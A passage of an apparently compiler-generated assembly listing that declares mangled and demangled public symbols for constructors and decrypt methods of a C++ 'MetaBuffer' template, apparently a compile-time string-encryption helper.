__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
PUBLIC	??0?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
PUBLIC	?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEAAPEBDXZ ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,39,std::integer_sequence<unsigned 